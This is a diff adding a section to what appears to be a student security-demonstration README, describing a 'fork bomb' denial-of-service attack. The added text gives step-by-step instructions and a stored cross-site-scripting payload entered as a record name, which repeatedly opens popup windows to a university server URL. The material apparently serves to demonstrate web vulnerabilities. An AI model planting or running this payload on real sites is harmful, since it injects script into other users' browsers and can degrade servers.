@@ -31,3 +31,14 @@
 3. Note the popup alert warning of possible attack
 
 ### Distributed Denial of Service (DDoS) Attack
+**Fork Bomb:**
+1. Make sure that the broswer with the site open will not block popups
+2. Add a new record, using the following as the value for the record name:
+>"&amp;gt;<script>
+function fork() {
+  	const win = window.open("http://flip3.engr.oregonstate.edu:6060/user/Kyle&12345");
+	setTimeout(fork(), 1);
+}
+fork(); </script>
+3. Select the name of the record (the code) from the record table
+NOTE: This does not bring down the school server (thankfully) rather it illustrates how to slow down a weak server
